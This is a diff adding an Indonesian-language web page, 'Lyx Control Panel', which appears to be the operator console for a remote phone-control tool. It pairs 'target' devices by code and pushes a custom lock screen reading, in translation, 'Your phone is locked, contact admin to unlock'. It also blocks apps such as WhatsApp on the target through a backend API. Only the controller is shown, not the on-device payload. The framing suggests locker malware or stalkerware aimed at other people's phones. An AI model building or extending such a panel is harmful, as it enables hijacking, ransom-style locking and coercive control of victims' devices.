@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lyx Control Panel 😈</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; }
+  body {
+    background: linear-gradient(135deg, #0a0a0a 0%, #1a0033 50%, #0a0a0a 100%);
+    min-height: 100vh;
+    color: #fff;
+    padding: 20px;
+  }
+  .header {
+    text-align: center;
+    margin-bottom: 25px;
+    padding: 15px;
+    background: rgba(20,0,40,0.7);
+    border-radius: 15px;
+    border: 1px solid #6a00ff;
+    box-shadow: 0 0 25px #6a00ff55;
+  }
+  .header h1 {
+    font-size: 24px;
+    background: linear-gradient(90deg, #b266ff, #ff00ff, #b266ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    letter-spacing: 2px;
+  }
+  .header p { font-size: 12px; color:#aaa; margin-top:5px; }
+
+  .card {
+    background: rgba(20,0,40,0.75);
+    border: 1px solid #6a00ff77;
+    border-radius: 15px;
+    padding: 18px;
+    margin-bottom: 18px;
+    box-shadow: 0 0 20px #6a00ff33;
+  }
+  .card h2 {
+    font-size: 16px;
+    color: #c77dff;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-bottom: 1px dashed #6a00ff55;
+    padding-bottom: 8px;
+  }
+  .pairing-box {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+  .pairing-code {
+    flex: 1;
+    min-width: 200px;
+    background: #0a0018;
+    border: 1px solid #6a00ff;
+    border-radius: 10px;
+    padding: 12px;
+    font-family: 'Courier New', monospace;
+    font-size: 18px;
+    letter-spacing: 4px;
+    text-align: center;
+    color: #00ffcc;
+    text-shadow: 0 0 10px #00ffcc88;
+  }
+  .btn {
+    background: linear-gradient(135deg, #6a00ff, #b300ff);
+    border: none;
+    color: #fff;
+    padding: 12px 20px;
+    border-radius: 10px;
+    cursor: pointer;
+    font-weight: bold;
+    font-size: 13px;
+    transition: all 0.25s;
+    box-shadow: 0 0 15px #6a00ff66;
+  }
+  .btn:hover { transform: translateY(-2px); box-shadow: 0 0 25px #b300ffaa; }
+  .btn:active { transform: scale(0.97); }
+  .btn.green { background: linear-gradient(135deg, #008844, #00cc66); box-shadow: 0 0 15px #00cc6666; }
+  .btn.red { background: linear-gradient(135deg, #880000, #cc0033); box-shadow: 0 0 15px #cc003366; }
+  .btn.gold { background: linear-gradient(135deg, #b8860b, #ffd700); color:#000; box-shadow: 0 0 15px #ffd70066;}
+
+  .device-list { display:flex; flex-direction:column; gap:12px; }
+  .device-item {
+    background: linear-gradient(135deg, #1a0033, #2a0055);
+    border: 1px solid #b266ff55;
+    border-radius: 12px;
+    padding: 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 10px;
+    transition: 0.25s;
+  }
+  .device-item:hover { border-color:#b266ff; box-shadow:0 0 20px #b266ff55; }
+  .device-info { display:flex; align-items:center; gap:12px; }
+  .device-icon { font-size: 28px; }
+  .device-name { font-size: 15px; font-weight: bold; }
+  .device-meta { font-size: 11px; color:#aaa; margin-top:3px; }
+  .status-on { color:#00ff88; font-size:11px; }
+  .status-on::before { content:"● "; }
+
+  /* Control Page */
+  .control-page { display:none; }
+  .control-page.active { display:block; }
+  .main-page.hidden { display:none; }
+
+  .back-btn {
+    background: #2a0055;
+    border: 1px solid #b266ff;
+    color:#fff;
+    padding: 8px 15px;
+    border-radius: 8px;
+    cursor: pointer;
+    margin-bottom: 15px;
+    font-size: 13px;
+  }
+
+  textarea, input[type=text], input[type=number] {
+    width: 100%;
+    background: #0a0018;
+    border: 1px solid #6a00ff77;
+    border-radius: 8px;
+    padding: 10px;
+    color: #fff;
+    font-family: 'Courier New', monospace;
+    font-size: 13px;
+    resize: vertical;
+  }
+  textarea:focus, input:focus { outline:none; border-color:#b266ff; box-shadow:0 0 10px #b266ff66; }
+
+  label { font-size: 12px; color:#c77dff; display:block; margin: 10px 0 5px; }
+
+  .app-list-item {
+    background: #0a0018;
+    border: 1px solid #6a00ff55;
+    border-radius: 8px;
+    padding: 10px;
+    margin-top: 8px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 13px;
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: linear-gradient(135deg, #00cc66, #008844);
+    color: #fff;
+    padding: 12px 25px;
+    border-radius: 10px;
+    font-size: 13px;
+    font-weight: bold;
+    box-shadow: 0 0 25px #00cc6688;
+    opacity: 0;
+    transition: all 0.35s;
+    z-index: 999;
+  }
+  .toast.show { opacity:1; transform: translateX(-50%) translateY(0); }
+  .toast.error { background: linear-gradient(135deg, #cc0033, #880000); box-shadow: 0 0 25px #cc003388; }
+</style>
+</head>
+<body>
+
+<!-- ================= HALAMAN UTAMA ================= -->
+<div class="main-page" id="mainPage">
+
+  <div class="header">
+    <h1>👑 LYX CONTROL PANEL 👑</h1>
+    <p>Made by ZAMZZZ • Sistem Kendali Perangkat</p>
+  </div>
+
+  <!-- CODE PAIRING -->
+  <div class="card">
+    <h2>🔑 Code Pairing</h2>
+    <div class="pairing-box">
+      <input type="text" class="pairing-code" id="pairingCode" value="--------" readonly>
+      <button class="btn gold" onclick="generateCode()">Generate</button>
+      <button class="btn green" onclick="copyCode()">Copy</button>
+    </div>
+    <p style="font-size:11px; color:#888; margin-top:8px;">
+      Masukkan code pairing ke aplikasi khusus untuk menghubungkan perangkat baru.
+    </p>
+  </div>
+
+  <!-- LIST DEVICE -->
+  <div class="card">
+    <h2>📱 List Device <span id="deviceCount" style="color:#00ff88; font-size:12px;">(0)</span></h2>
+    <div class="device-list" id="deviceList">
+      <p style="text-align:center; color:#666; font-size:12px; padding:20px;">
+        Belum ada perangkat terhubung.<br>Generate code pairing lalu masukkan ke aplikasi target.
+      </p>
+    </div>
+  </div>
+
+</div>
+
+<!-- ================= HALAMAN CONTROL DEVICE ================= -->
+<div class="control-page" id="controlPage">
+  <button class="back-btn" onclick="showMain()">← Kembali ke List Device</button>
+
+  <div class="header">
+    <h1 id="deviceTitle">🎯 Control Device</h1>
+    <p id="deviceSub">Target: -</p>
+  </div>
+
+  <!-- 1. LOCK CUSTOM HTML -->
+  <div class="card">
+    <h2>🔒 1. Lock Custom HTML</h2>
+    <label>Tulis HTML tampilan lock screen:</label>
+    <textarea id="lockHtml" rows="8" placeholder="&lt;h1&gt;HP Kamu Terkunci 🔒&lt;/h1&gt;
+&lt;p&gt;Hubungi admin untuk membuka&lt;/p&gt;
+&lt;style&gt;body{background:#000;color:#ff0044;text-align:center;padding-top:100px;font-family:sans-serif;}&lt;/style&gt;"></textarea>
+    <br><br>
+    <button class="btn red" onclick="sendLock()">🔒 Kirim Lock Screen</button>
+    <button class="btn" onclick="unlockScreen()">🔓 Buka Lock</button>
+  </div>
+
+  <!-- 2. BLOKIR APLIKASI -->
+  <div class="card">
+    <h2>🚫 2. Blokir Aplikasi</h2>
+    <label>Nama Aplikasi (contoh: com.whatsapp / WhatsApp):</label>
+    <input type="text" id="appName" placeholder="Masukkan nama atau package aplikasi">
+
+    <label>Pesan Blokir yang muncul di target:</label>
+    <textarea id="blockMsg" rows="3" placeholder="Aplikasi ini diblokir oleh admin. Hubungi pengelola perangkat."></textarea>
+
+    <br><br>
+    <button class="btn red" onclick="addBlockedApp()">➕ Tambah & Blokir Aplikasi</button>
+
+    <div id="blockedAppList" style="margin-top:15px;"></div>
+  </div>
+
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast">Berhasil!</div>
+
+<script>
+/* ==================== STATE ==================== */
+let devices = JSON.parse(localStorage.getItem('lyx_devices') || '[]');
+let currentDeviceId = null;
+let blockedApps = JSON.parse(localStorage.getItem('lyx_blocked') || '{}');
+
+const API_BASE = "http://localhost:3000"; // Ganti dengan server backend Tuan
+
+/* ==================== TOAST ==================== */
+function showToast(msg, isError=false){
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show' + (isError ? ' error' : '');
+  setTimeout(()=>{ t.className='toast'; }, 2200);
+}
+
+/* ==================== PAIRING CODE ==================== */
+function generateCode(){
+  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  let code = '';
+  for(let i=0;i<8;i++) code += chars[Math.floor(Math.random()*chars.length)];
+  document.getElementById('pairingCode').value = code;
+
+  // Kirim ke server untuk didaftarkan
+  fetch(API_BASE + '/api/generate-pairing', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ code })
+  }).catch(()=>{});
+
+  showToast('Code Pairing dibuat: ' + code);
+}
+
+function copyCode(){
+  const inp = document.getElementById('pairingCode');
+  if(inp.value === '--------'){ showToast('Generate dulu!', true); return; }
+  inp.select();
+  document.execCommand('copy');
+  navigator.clipboard.writeText(inp.value).catch(()=>{});
+  showToast('Code Pairing dicopy!');
+}
+
+/* ==================== RENDER DEVICE ==================== */
+function renderDevices(){
+  const list = document.getElementById('deviceList');
+  const count = document.getElementById('deviceCount');
+  count.textContent = '(' + devices.length + ')';
+
+  if(devices.length === 0){
+    list.innerHTML = '<p style="text-align:center; color:#666; font-size:12px; padding:20px;">Belum ada perangkat terhubung.<br>Generate code pairing lalu masukkan ke aplikasi target.</p>';
+    return;
+  }
+
+  list.innerHTML = devices.map(d => `
+    <div class="device-item">
+      <div class="device-info">
+        <div class="device-icon">${d.type === 'android' ? '🤖' : d.type === 'ios' ? '🍎' : '💻'}</div>
+        <div>
+          <div class="device-name">${escapeHtml(d.name)}</div>
+          <div class="device-meta">
+            ${d.model || 'Unknown'} • ${d.os || '-'}<br>
+            <span class="status-on">Online</span>
+          </div>
+        </div>
+      </div>
+      <button class="btn green" onclick="openControl('${d.id}')">⚙️ Open Control</button>
+    </div>
+  `).join('');
+}
+
+function escapeHtml(s){
+  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+/* ==================== POLLING DEVICE BARU ==================== */
+function pollDevices(){
+  fetch(API_BASE + '/api/devices')
+    .then(r => r.json())
+    .then(data => {
+      if(Array.isArray(data) && JSON.stringify(data) !== JSON.stringify(devices)){
+        devices = data;
+        localStorage.setItem('lyx_devices', JSON.stringify(devices));
+        renderDevices();
+        showToast('Perangkat baru terhubung!');
+      }
+    })
+    .catch(()=>{});
+}
+
+/* ==================== OPEN CONTROL ==================== */
+function openControl(id){
+  currentDeviceId = id;
+  const d = devices.find(x => x.id === id);
+  if(!d) return;
+
+  document.getElementById('deviceTitle').textContent = '🎯 ' + d.name;
+  document.getElementById('deviceSub').textContent = 'Target: ' + (d.model || d.name) + ' • ' + (d.os || 'Unknown');
+  document.getElementById('mainPage').classList.add('hidden');
+  document.getElementById('controlPage').classList.add('active');
+
+  loadBlockedApps();
+}
+
+function showMain(){
+  currentDeviceId = null;
+  document.getElementById('controlPage').classList.remove('active');
+  document.getElementById('mainPage').classList.remove('hidden');
+}
+
+/* ==================== 1. LOCK SCREEN ==================== */
+function sendLock(){
+  const html = document.getElementById('lockHtml').value.trim();
+  if(!html){ showToast('Isi HTML dulu!', true); return; }
+  if(!currentDeviceId){ showToast('Pilih device dulu!', true); return; }
+
+  fetch(API_BASE + '/api/lock', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({
+      deviceId: currentDeviceId,
+      html: html,
+      action: 'lock'
+    })
+  })
+  .then(r => r.json())
+  .then(res => {
+    if(res.success) showToast('🔒 Layar target terkunci!');
+    else showToast('Gagal kirim lock', true);
+  })
+  .catch(()=> showToast('Server tidak terjangkau', true));
+}
+
+function unlockScreen(){
+  if(!currentDeviceId){ showToast('Pilih device dulu!', true); return; }
+  fetch(API_BASE + '/api/lock', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ deviceId: currentDeviceId, action:'unlock' })
+  })
+  .then(r => r.json())
+  .then(res => showToast(res.success ? '🔓 Lock dibuka' : 'Gagal', !res.success))
+  .catch(()=> showToast('Server tidak terjangkau', true));
+}
+
+/* ==================== 2. BLOKIR APLIKASI ==================== */
+function loadBlockedApps(){
+  const apps = blockedApps[currentDeviceId] || [];
+  const box = document.getElementById('blockedAppList');
+  if(apps.length === 0){ box.innerHTML=''; return; }
+
+  box.innerHTML = '<label>Aplikasi terblokir:</label>' + apps.map((a, i) => `
+    <div class="app-list-item">
+      <div>
+        <b>🚫 ${escapeHtml(a.name)}</b>
+        <div style="font-size:11px;color:#aaa;margin-top:3px;">${escapeHtml(a.message)}</div>
+      </div>
+      <button class="btn red" style="padding:6px 12px;font-size:11px;" onclick="removeBlockedApp(${i})">Hapus</button>
+    </div>
+  `).join('');
+}
+
+function addBlockedApp(){
+  if(!currentDeviceId){ showToast('Pilih device dulu!', true); return; }
+  const name = document.getElementById('appName').value.trim();
+  const msg = document.getElementById('blockMsg').value.trim() || 'Aplikasi ini diblokir oleh admin.';
+
+  if(!name){ showToast('Nama aplikasi wajib diisi!', true); return; }
+
+  if(!blockedApps[currentDeviceId]) blockedApps[currentDeviceId] = [];
+  blockedApps[currentDeviceId].push({ name, message: msg });
+  localStorage.setItem('lyx_blocked', JSON.stringify(blockedApps));
+
+  // Kirim ke server
+  fetch(API_BASE + '/api/block-app', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({
+      deviceId: currentDeviceId,
+      appName: name,
+      message: msg
+    })
+  })
+  .then(r => r.json())
+  .then(res => showToast(res.success ? '🚫 Aplikasi diblokir di target!' : 'Gagal kirim', !res.success))
+  .catch(()=> showToast('Server tidak terjangkau', true));
+
+  document.getElementById('appName').value = '';
+  document.getElementById('blockMsg').value = '';
+  loadBlockedApps();
+}
+
+function removeBlockedApp(index){
+  const apps = blockedApps[currentDeviceId] || [];
+  const removed = apps.splice(index, 1)[0];
+  localStorage.setItem('lyx_blocked', JSON.stringify(blockedApps));
+
+  fetch(API_BASE + '/api/unblock-app', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ deviceId: currentDeviceId, appName: removed.name })
+  }).catch(()=>{});
+
+  loadBlockedApps();
+  showToast('Aplikasi dihapus dari blokir');
+}
+
+/* ==================== INIT ==================== */
+renderDevices();
+setInterval(pollDevices, 5000); // cek device baru tiap 5 detik
+</script>
+</body>
+</html>
